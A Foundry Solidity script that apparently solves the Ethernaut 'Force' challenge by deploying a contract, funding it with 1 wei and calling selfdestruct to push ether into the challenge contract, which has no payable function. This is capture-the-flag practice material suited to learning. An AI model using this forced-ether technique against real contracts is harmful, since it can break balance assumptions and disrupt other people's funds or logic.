// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { Force } from "../src/07_Force.sol";

contract Attacker {

  address challengeInstanceAddress;
  constructor(address _challengeInstanceAddress) {
    challengeInstanceAddress = _challengeInstanceAddress;
  }
  
  function destroy() external {
    selfdestruct(payable(challengeInstanceAddress));
  }
  receive() external payable {}
}

contract ForceAttacker is Script {

  address challengeInstanceAddress = 0x345Dbbe34265645e8000370B1b0934eC158c2D4E;
  Force challenge = Force(challengeInstanceAddress);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    (bool success, ) = address(attacker).call{value: 1 wei}("");
    require(success, "Failed to send eth");
    
    attacker.destroy();
    
    console.log("Balance of challenge contract: ", address(challenge).balance);
    
    vm.stopBroadcast();
  }

}